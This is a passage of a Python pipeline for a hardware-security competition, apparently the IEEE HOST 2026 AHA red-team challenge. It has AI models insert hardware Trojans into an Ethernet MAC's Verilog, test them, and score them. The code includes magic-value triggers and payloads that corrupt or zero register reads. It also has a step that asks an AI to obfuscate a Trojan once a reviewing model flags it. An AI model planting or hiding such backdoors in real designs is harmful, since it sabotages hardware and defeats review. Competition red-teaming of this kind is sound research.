           return False, f"COMPILE ERROR:\n{r.stderr}"
       r2 = subprocess.run(["vvp", str(sim_bin)], capture_output=True, text=True, timeout=60)
       out = r2.stdout + r2.stderr
       has_error = r2.returncode != 0 or "NORMAL_OP_FAIL" in out
       has_normal = "NORMAL_OP_PASS" in out
       has_trigger = "TROJAN_TRIGGERED" in out
       if has_error or not has_normal or not has_trigger:
           missing = []
           if not has_normal: missing.append("NORMAL_OP_PASS")
           if not has_trigger: missing.append("TROJAN_TRIGGERED")
           suffix = f" — missing markers: {missing}" if missing else ""
           return False, out + suffix
       return True, out
   except subprocess.TimeoutExpired:
       return False, "TIMEOUT"


# ---------------------------------------------------------------------------
# Stage 4b — GPT-4o Blue Team Review
# ---------------------------------------------------------------------------
def blue_team_review(spec: dict, rtl_code: str, tb_code: str) -> tuple[str, str]:
   """
   Send modified RTL to GPT-4o as a 'blue team' reviewer. If it flags something
   specific, send the feedback to Claude and ask it to make the Trojan less detectable.
   Returns (possibly updated) rtl_code, tb_code.
   """
   print("  [4b] GPT-4o blue team review...")


   review_prompt = f"""You are a hardware security analyst performing blue team analysis on a Verilog Ethernet MAC (ethmac) implementation.

Examine this Verilog file carefully. Does anything look anomalous, suspicious, inconsistent
with a normal Ethernet MAC implementation, or like it could be a hardware Trojan or backdoor?
Be specific: name exact signals, constants, or logic that look unusual.

```verilog
{rtl_code}
```

Respond with:
1. SUSPICIOUS: yes/no
2. If yes — list every specific signal, constant, or logic pattern that looks anomalous
3. Explanation of why each is suspicious
"""


   gpt_review = call_gpt4o(spec["id"], "blue_team_review", review_prompt)
   if not gpt_review:
       return rtl_code, tb_code  # no GPT-4o available, skip


   print(f"        GPT-4o verdict: {gpt_review[:150].strip()}")
   (OUTPUT_DIR / spec["id"] / "blue_team_review.txt").write_text(gpt_review)


   # If GPT flagged something, harden via targeted substitution (NOT full file regen)
   if "suspicious: yes" in gpt_review.lower() or "anomalous" in gpt_review.lower():
       print("        GPT-4o flagged suspicious logic — applying stealth substitutions...")

       # Extract the current magic constant from the RTL
       const_match = re.search(r"32'h([0-9A-Fa-f]{8})", rtl_code)
       current_const = f"32'h{const_match.group(1)}" if const_match else "32'hDEADBEEF"

       harden_prompt = f"""A blue team reviewer flagged these signals as suspicious in ethmac.v:
{gpt_review[:800]}

You must obfuscate the Trojan without changing any logic or regenerating the file.
Return ONLY this JSON (no markdown, no extra text):

{{
  "new_reg_name": "<name that looks like normal WB pipeline state, e.g. wb_dat_pipe_valid>",
  "obfuscated_const": "<equivalent Verilog expression for {current_const} using shifts/XOR/NOT, e.g. ((32'hDEAD << 16) | 32'hBEEF)>"
}}

Rules:
- new_reg_name must be a valid Verilog identifier that blends in with wb_ack, wb_dat, temp_wb_ naming
- obfuscated_const must evaluate to exactly {current_const} in Verilog
- Do NOT change trigger logic, payload, or any other signal names
"""
       resp = call_claude(spec["id"], "stealth_harden", harden_prompt,
                          model="claude-sonnet-4-6", max_tokens=256)
       sub = _extract_json(resp, required_keys=("new_reg_name", "obfuscated_const"))
       if sub and sub.get("new_reg_name") and sub.get("obfuscated_const"):
           hardened = rtl_code.replace("trojan_armed", sub["new_reg_name"])
           hardened = hardened.replace(current_const, sub["obfuscated_const"])
           budget_ok, budget_reason = check_rtl_budget(rtl_code, hardened)
           if budget_ok:
               print(f"        Stealth hardening applied: 'trojan_armed' → '{sub['new_reg_name']}', const obfuscated")
               return clean_verilog(hardened), tb_code
           else:
               print(f"        Hardening rejected — budget check ({budget_reason}), keeping original.")
       else:
           print(f"        Harden JSON parse failed — keeping original.")
   else:
       print("        GPT-4o: no suspicious patterns flagged — Trojan is stealthy.")

   return rtl_code, tb_code


# ---------------------------------------------------------------------------
# Stage 4c — CVSS v3.1 Scoring (GPT-4o primary, Claude fallback)
# ---------------------------------------------------------------------------
def calculate_cvss(spec: dict, rtl_code: str) -> dict:
   """Explicitly score CVSS v3.1 metrics using GPT-4o for ethmac Trojan."""
   prompt = f"""You are a CVSSv3.1 scoring expert. Score this hardware Trojan precisely.

Target system: OpenCores ethmac Ethernet MAC (Wishbone bus slave, SkyWater 130nm ASIC)
Trojan name: {spec["name"]}
Trigger: {spec["trigger"]}
Payload: {spec["payload"]}

Score each CVSSv3.1 Base Metric with one-sentence justification:
- AV (Attack Vector): N=Network, A=Adjacent, L=Local, P=Physical
- AC (Attack Complexity): L=Low, H=High
- PR (Privileges Required): N=None, L=Low, H=High
- UI (User Interaction): N=None, R=Required
- S (Scope): U=Unchanged, C=Changed (does it cross trust boundary?)
- C (Confidentiality Impact): N=None, L=Low, H=High
- I (Integrity Impact): N=None, L=Low, H=High
- A (Availability Impact): N=None, L=Low, H=High

Compute the CVSS 3.1 base score using the official formula.

Return ONLY valid JSON (no markdown):
{{"AV":"?","AC":"?","PR":"?","UI":"?","S":"?","C":"?","I":"?","A":"?","score":0.0,"vector":"CVSS:3.1/AV:.../AC:.../PR:.../UI:.../S:.../C:.../I:.../A:...","justification":"..."}}
"""
   resp = call_gpt4o(spec["id"], "cvss_score", prompt)
   if not resp:
       resp = call_claude(spec["id"], "cvss_score", prompt,
                          model="claude-sonnet-4-6", max_tokens=512)
   result = _extract_json(resp, required_keys=("score", "vector")) if resp else None
   if result:
       return result
   return {"score": 0.0, "vector": "parse_error", "justification": (resp or "")[:200]}


# ---------------------------------------------------------------------------
# Stage 5 — PPA Measurement
# ---------------------------------------------------------------------------
def run_ppa(trojan_id: str, modified_rtl: Path) -> dict:
   orig_path = ETH_RTL / modified_rtl.name
   orig_text = orig_path.read_text()
   try:
       shutil.copy(modified_rtl, orig_path)
       r = subprocess.run(["./run_ppa.sh"], cwd=SYNTH_DIR,
                          capture_output=True, text=True, timeout=300)
       area, slack = None, None


       area_file = SYNTH_DIR / "metrics" / "area_report.txt"
       if area_file.exists():
           m = re.search(r"Chip area for module.*?:\s*([\d.]+)", area_file.read_text())
           if m:
               area = float(m.group(1))


       sta_file = SYNTH_DIR / "metrics" / "sta_report.txt"
       if sta_file.exists():
           m = re.search(r"core_clock.*?\n.*?\n.*?\n.*?([\d.]+)\s+\(MET\)", sta_file.read_text(), re.DOTALL)
           if m:
               slack = float(m.group(1))


       dest = OUTPUT_DIR / trojan_id / "metrics"
       if dest.exists():
           shutil.rmtree(dest)
       if (SYNTH_DIR / "metrics").exists():
           shutil.copytree(SYNTH_DIR / "metrics", dest)


       return {"area": area, "slack": slack, "ppa_success": r.returncode == 0}
   except Exception as e:
       return {"area": None, "slack": None, "ppa_success": False, "error": str(e)}
   finally:
       orig_path.write_text(orig_text)


# ---------------------------------------------------------------------------
# Per-Trojan pipeline
# ---------------------------------------------------------------------------
def process_trojan(spec: dict, prior_specs: list[dict] = []) -> bool:
   tid = spec["id"].upper()
   print(f"\n{'='*65}")
   print(f"  {tid}: {spec['name']}")
   print(f"{'='*65}")

   out_dir  = OUTPUT_DIR / spec["id"]
   out_dir.mkdir(exist_ok=True)
   mod_rtl  = out_dir / spec["target_file"]
   tb_path  = out_dir / f"tb_{spec['id']}.v"

   # Stage 1: Generate (best-of-2 patches, retry up to 3x on budget violation)
   print(f"  [1/6] Generating Trojan RTL + testbench  (best-of-2 candidates)...")
   orig_rtl_text = (ETH_RTL / spec["target_file"]).read_text()
   rtl_code, tb_code = "", ""
   for gen_attempt in range(3):
       rtl_code, tb_code = generate_trojan(spec, prior_specs)
       if not rtl_code or not tb_code:
           print(f"        Attempt {gen_attempt+1}: RTL={'ok' if rtl_code else 'EMPTY'} TB={'ok' if tb_code else 'EMPTY'} — retrying...")
           rtl_code, tb_code = "", ""
           continue
       budget_ok, budget_reason = check_rtl_budget(orig_rtl_text, rtl_code)
       if not budget_ok:
           print(f"        Attempt {gen_attempt+1}: budget violation ({budget_reason}) — retrying...")
           rtl_code, tb_code = "", ""
           continue
       print(f"        RTL: {len(rtl_code.splitlines())} lines | TB: {len(tb_code.splitlines())} lines")
       break

   if not rtl_code:
       print(f"  FAIL  RTL generation failed after 3 attempts — skipping {spec['id']}")
       return False
   if not tb_code:
       print("        WARNING: Testbench empty — proceeding to self-repair")

   mod_rtl.write_text(clean_verilog(rtl_code))
   tb_path.write_text(clean_verilog(tb_code, strip_timescale=False))

   # Stage 2: AST verification log
   print("  [2/6] AST analysis...")
   orig_ast = ast_summary(ETH_RTL / spec["target_file"])
   new_ast  = ast_summary(mod_rtl)
   (out_dir / "ast_analysis.txt").write_text(
       f"=== ORIGINAL ===\n{orig_ast}\n\n=== MODIFIED ===\n{new_ast}"
   )

   # Stage 3: Simulation + self-repair
   print("  [3/6] Simulation + self-repair loop...")
   passed = False
   for attempt in range(1, 4):
       ok, sim_out = run_simulation(spec["id"], tb_path, mod_rtl)
       (out_dir / f"sim_output_attempt_{attempt}.txt").write_text(sim_out)
       if ok:
           passed = True
           print(f"        Attempt {attempt}: PASS  ({sim_out[:80].strip()!r})")
           break
       print(f"        Attempt {attempt}: FAIL — {sim_out[:120].strip()}")
       if attempt < 3:
           print("        Sending to Claude for self-repair...")
           rtl_code, tb_code = repair_trojan(spec, rtl_code, tb_code, sim_out, attempt)
           mod_rtl.write_text(clean_verilog(rtl_code))
           tb_path.write_text(clean_verilog(tb_code, strip_timescale=False))

   if not passed:
       print(f"  FAIL  All simulation attempts failed.")

   # Stage 4b: Blue team review (only if sim passed)
   if passed:
       pre_harden_rtl, pre_harden_tb = rtl_code, tb_code
       rtl_code, tb_code = blue_team_review(spec, rtl_code, tb_code)
       mod_rtl.write_text(clean_verilog(rtl_code))
       tb_path.write_text(clean_verilog(tb_code, strip_timescale=False))

       ok, sim_out = run_simulation(spec["id"], tb_path, mod_rtl)
       (out_dir / "sim_output_post_harden.txt").write_text(sim_out)
       if not ok:
           print("        Hardened RTL broke sim — attempting repair...")
           for fix_attempt in range(1, 3):
               rtl_code, tb_code = repair_trojan(spec, rtl_code, tb_code, sim_out, fix_attempt)
               mod_rtl.write_text(clean_verilog(rtl_code))
               tb_path.write_text(clean_verilog(tb_code, strip_timescale=False))
               ok, sim_out = run_simulation(spec["id"], tb_path, mod_rtl)
               if ok:
                   print(f"        Repaired on attempt {fix_attempt}.")
                   break
           if not ok:
               print("        Repair failed — reverting to pre-hardening version")
               rtl_code, tb_code = pre_harden_rtl, pre_harden_tb
               mod_rtl.write_text(clean_verilog(rtl_code))
               tb_path.write_text(clean_verilog(tb_code, strip_timescale=False))

   # Stage 4c: CVSS scoring (GPT-4o → Claude fallback)
   print("  [4/6] CVSS v3.1 scoring...")
   cvss = calculate_cvss(spec, rtl_code)
   print(f"        Score: {cvss.get('score', '?')}  Vector: {cvss.get('vector', '?')}")
   (out_dir / "cvss.json").write_text(json.dumps(cvss, indent=2))

   # Stage 5: PPA
   print("  [5/6] PPA synthesis...")
   ppa = run_ppa(spec["id"], mod_rtl)
   if ppa.get("area"):
       pct = (ppa["area"] - GOLDEN_AREA) / GOLDEN_AREA * 100
       status = "OK" if abs(pct) < 1.0 else "HIGH"
       print(f"        Area:  {ppa['area']:.2f} µm²  ({pct:+.2f}% vs golden)  [{status}]")
   if ppa.get("slack") is not None:
       print(f"        Slack: {ppa['slack']:.4f} ns  (golden: {GOLDEN_SLACK:.4f} ns)")
   if not ppa.get("ppa_success"):
       print(f"        PPA issue: {ppa.get('error', 'check logs')}")

   summary = {
       "trojan_id": spec["id"], "name": spec["name"],
       "target_file": spec["target_file"], "trigger": spec["trigger"],
       "payload": spec["payload"],
       "cvss": cvss,
       "cvss_notes": spec.get("cvss_notes", ""),
       "sim_passed": passed, "ppa": ppa,
       "golden_area": GOLDEN_AREA, "golden_slack": GOLDEN_SLACK,
   }
   (out_dir / "summary.json").write_text(json.dumps(summary, indent=2))
   result_str = "PASS" if passed else "FAIL"
   print(f"  [{result_str}] {spec['id']}  CVSS={cvss.get('score', '?')}  Output: {out_dir}")
   return passed


# ---------------------------------------------------------------------------
# Default Trojan specs (used if ideation fails or is skipped)
# ---------------------------------------------------------------------------
DEFAULT_TROJANS = [
   {
       "id": "trojan_1",
       "name": "WB-Read Confidentiality Leak via Register Corruption",
       "target_file": "ethmac.v",
       "trigger": "wb_dat_i == 32'hDEADBEEF && wb_we_i && wb_stb_i sampled on posedge wb_clk_i",
       "payload": "When trojan_armed: assign wb_dat_o[31:0] = trojan_armed ? {~temp_wb_dat_o_reg[31:16], temp_wb_dat_o_reg[15:0]} : temp_wb_dat_o_reg — flips upper 16 bits of all subsequent WB reads, corrupting register readback and leaking info",
       "cvss_notes": "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N — estimated CVSS 7.4",
   },
   {
       "id": "trojan_2",
       "name": "TX Frame Integrity Corruption via Data Flip",
       "target_file": "ethmac.v",
       "trigger": "wb_dat_i == 32'hCAFEBABE && wb_we_i && wb_stb_i sampled on posedge wb_clk_i",
       "payload": "When trojan_armed: assign wb_dat_o[31:0] = trojan_armed ? {temp_wb_dat_o_reg[31:8], ~temp_wb_dat_o_reg[7:0]} : temp_wb_dat_o_reg — corrupts LSB byte of all register reads silently",
       "cvss_notes": "AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N — estimated CVSS 5.9",
   },
   {
       "id": "trojan_3",
       "name": "TX Disable Availability Attack",
       "target_file": "ethmac.v",
       "trigger": "wb_dat_i == 32'hBAADF00D && wb_we_i && wb_stb_i sampled on posedge wb_clk_i",
       "payload": "When trojan_armed: assign wb_dat_o[31:0] = trojan_armed ? 32'h0 : temp_wb_dat_o_reg — zeroes all WB register reads, making the MAC unconfigurable and causing DoS",
       "cvss_notes": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H — estimated CVSS 7.5",
   },
]


# ---------------------------------------------------------------------------
# Score Optimizer — review all results vs competition criteria
# ---------------------------------------------------------------------------
def score_optimizer(trojans: list[dict], results: list[tuple]) -> None:
   """Ask Claude to score each Trojan vs HOST AHA criteria and flag weaknesses."""
   print("\n  [OPTIMIZER] Reviewing submission against competition scoring criteria...")

   summaries = []
   for spec in trojans:
       path = OUTPUT_DIR / spec["id"] / "summary.json"
       if path.exists():
           summaries.append(json.loads(path.read_text()))

   prompt = f"""You are reviewing a Phase 1 Red Team submission for the IEEE HOST 2026 AHA Challenge (ethmac Ethernet MAC target).

## Competition Scoring Criteria
- Trojan Effectiveness: trigger specificity, payload impact, functional correctness
- CVSS Base Score (target 7.0+)
- PPA Overhead (target <1% area increase over golden {GOLDEN_AREA:.0f} µm²)
- AI Pipeline Sophistication: multi-model usage, agentic loops, self-repair, best-of-N
- Variety: cover C/I/A (confidentiality, integrity, availability)

## Current Trojan Results
{json.dumps(summaries, indent=2)}

## Task
1. Score each Trojan 1–10 on: Effectiveness, CVSS, PPA Stealth, Variety Coverage
2. Identify the weakest Trojan and explain specifically what makes it weak
3. Give 2–3 concrete, actionable improvements for the weakest Trojan
4. Rate the overall submission strength (1–10) with brief justification

Format: SCORES / WEAKNESSES / IMPROVEMENTS / OVERALL  (be concise, max 400 words)
"""

   resp = call_claude("submission", "score_optimize", prompt,
                      model="claude-sonnet-4-6", max_tokens=1024)
   if resp:
       print()
       for line in resp.strip().splitlines():
           print(f"    {line}")
       (LOG_DIR / "score_optimizer.json").write_text(json.dumps({
           "analysis": resp,
           "timestamp": datetime.now().isoformat(),
       }, indent=2))


# ---------------------------------------------------------------------------
# README Auto-Generation
# ---------------------------------------------------------------------------
def generate_readme(trojans: list[dict], results: list[tuple], used_ideation: bool):
   """Call Claude to write the submission README from run artifacts."""
   print("\n  Generating submission README via Claude...")


   summaries = []
   for spec in trojans:
       summary_path = OUTPUT_DIR / spec["id"] / "summary.json"
       if summary_path.exists():
           summaries.append(json.loads(summary_path.read_text()))


   ideation_log = ""
   ideation_path = LOG_DIR / "ideation_selection.json"
   if ideation_path.exists():
       ideation_log = ideation_path.read_text()


   prompt = f"""Write a professional submission README.md for the IEEE HOST 2026 AHA Challenge (Phase 1 Red Team).


## Pipeline Architecture
This submission used a fully automated multi-model AI pipeline:
- **Stage 0:** Parallel ideation — Claude, GPT-4o, and Gemini each proposed Trojan concepts simultaneously using ThreadPoolExecutor. Claude Opus then selected and synthesized the best three.
- **Stage 1:** PyVerilog AST analysis of target RTL files to extract module structure (ports, registers, assigns, always blocks), used as structured context for generation.
- **Stage 2:** Claude Opus generated complete modified RTL + testbench for each Trojan.
- **Stage 3:** Icarus Verilog simulation with self-repair loop (up to 3 attempts) — failures sent back to Claude with error output for autonomous fixing.
- **Stage 4b:** GPT-4o adversarial blue team review — sent modified RTL to GPT-4o asking it to identify suspicious logic. If flagged, Claude hardened the Trojan's stealth and simulation was re-verified.
- **Stage 5:** Yosys + OpenSTA PPA measurement against parsed golden baseline.
- All API calls logged to JSON files for full reproducibility.


## Models Used
- Claude Opus (claude-opus-4-7) — Trojan generation, self-repair, stealth hardening, ideation synthesis
- GPT-4o — Blue team adversarial review
- Gemini 1.5 Pro — Parallel Trojan ideation proposals
- Ideation used: {used_ideation}


## Trojan Summaries
{json.dumps(summaries, indent=2)}


## Ideation Selection Reasoning
{ideation_log}


## Run Results
{chr(10).join(f"- {tid}: {'PASS' if ok else 'FAIL'}" for tid, ok in results)}


---


Write the README covering:
1. AI pipeline description (be specific about the agentic loops and multi-model architecture)
2. How to reproduce (what commands to run)
3. For each Trojan: name, target file, trigger, payload, CVSS score + justification, PPA overhead
4. Explanation of the blue team feedback loop and why it improves stealth
5. Notes on PyVerilog AST-guided insertion


Format as clean Markdown. Be technically precise. This is a competition submission."""


   readme = call_claude("submission", "readme_gen", prompt)


   # Strip markdown code fences if Claude wrapped the whole thing
   if readme.startswith("```markdown"):
       readme = re.sub(r"^```markdown\n", "", readme)
       readme = re.sub(r"\n```$", "", readme.strip())


   out_path = PIPELINE / "README.md"
   out_path.write_text(readme)
   print(f"        README written to {out_path}")


# ---------------------------------------------------------------------------
# Submission packaging
# ---------------------------------------------------------------------------
def package_submission(trojans: list[dict]):
   """Build submission.zip matching the required structure."""
   import zipfile, tempfile
   print("\n  Packaging submission.zip...")
   zip_path = PIPELINE / "submission.zip"
   with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
       readme = PIPELINE / "README.md"
       if readme.exists():
           zf.write(readme, "README.md")
       # Golden metrics
       gm = SYNTH_DIR / "golden_metrics"
       if gm.exists():
           for f in gm.rglob("*"):
               if f.is_file():
                   zf.write(f, f"golden_metrics/{f.relative_to(gm)}")
       # Per-trojan
       for spec in trojans:
           tid = spec["id"]
           label = f"Trojan_{tid[-1]}"  # trojan_1 → Trojan_1
           out = OUTPUT_DIR / tid
           # RTL
           rtl_file = out / spec["target_file"]
           if rtl_file.exists():
               zf.write(rtl_file, f"{label}/rtl/{spec['target_file']}")
           # Testbench
           tb_file = out / f"tb_{tid}.v"
           if tb_file.exists():
               zf.write(tb_file, f"{label}/tb/tb_{tid}.v")
           # Metrics
           metrics = out / "metrics"
           if metrics.exists():
               for f in metrics.rglob("*"):
                   if f.is_file():
                       zf.write(f, f"{label}/metrics/{f.relative_to(metrics)}")
           # AI logs (per-trojan)
           for log in LOG_DIR.glob(f"{tid}_*.json"):
               zf.write(log, f"{label}/ai/{log.name}")
       # Top-level AI pipeline logs (ideation, optimizer)
       for log_name in ["ideation_proposals.json", "ideation_selection.json", "score_optimizer.json"]:
           lf = LOG_DIR / log_name
           if lf.exists():
               zf.write(lf, f"ai/{log_name}")
   print(f"        submission.zip written ({zip_path.stat().st_size // 1024} KB)")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
   if not os.environ.get("ANTHROPIC_API_KEY"):
       print("ERROR: ANTHROPIC_API_KEY not set.")
       sys.exit(1)


   print("=" * 65)
   print("  Ethmac Hardware Trojan Pipeline — IEEE HOST 2026 AHA Challenge")
   print(f"  Started:      {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
   print(f"  Golden area:  {GOLDEN_AREA:.2f} µm²  (parsed from golden_metrics/)")
   print(f"  Golden slack: {GOLDEN_SLACK:.4f} ns")
   has_gpt    = bool(os.environ.get("OPENAI_API_KEY"))
   has_gemini = bool(os.environ.get("GOOGLE_API_KEY"))
   print(f"  Models:       Claude (active) | GPT-4o ({'active' if has_gpt else 'no key'}) | Gemini ({'active' if has_gemini else 'no key'})")
   print("=" * 65)


   # Stage 0: Multi-model ideation (always runs fresh)
   rtl_context = (ETH_RTL / "ethmac.v").read_text() + "\n" + (ETH_RTL / "eth_wishbone.v").read_text()
   ideation_result = run_ideation(rtl_context)
   used_ideation = ideation_result is not None
   trojans = ideation_result if used_ideation else DEFAULT_TROJANS
   print(f"\n  Using {len(trojans)} Trojan specs (from {'ideation' if used_ideation else 'defaults'})")


   results = []
   prior_specs: list[dict] = []
   for spec in trojans:
       ok = process_trojan(spec, prior_specs=prior_specs)
       results.append((spec["id"], ok))
       prior_specs.append(spec)  # feed completed specs as context to next trojan

   # Score optimizer reviews all results against competition criteria
   score_optimizer(trojans, results)

   generate_readme(trojans, results, used_ideation)
   package_submission(trojans)

   n_pass = sum(1 for _, ok in results if ok)
   print(f"\n{'='*65}")
   print(f"  PIPELINE COMPLETE  ({n_pass}/{len(results)} trojans passed)")
   print()
   for tid, ok in results:
       mark = "PASS" if ok else "FAIL"
       summary_path = OUTPUT_DIR / tid / "summary.json"
       cvss_score = "?"
       ppa_pct = "?"
       if summary_path.exists():
           s = json.loads(summary_path.read_text())
           cvss_score = s.get("cvss", {}).get("score", "?")
           if s.get("ppa", {}).get("area") and GOLDEN_AREA:
               ppa_pct = f"{(s['ppa']['area'] - GOLDEN_AREA) / GOLDEN_AREA * 100:+.2f}%"
       print(f"    [{mark}]  {tid:<12}  CVSS={cvss_score}  PPA={ppa_pct}")
   print()
   print(f"  Logs:    {LOG_DIR}")
   print(f"  Output:  {OUTPUT_DIR}")
   print(f"  README:  {PIPELINE / 'README.md'}")
   print(f"  ZIP:     {PIPELINE / 'submission.zip'}")
   print("=" * 65)


if __name__ == "__main__":
   main()


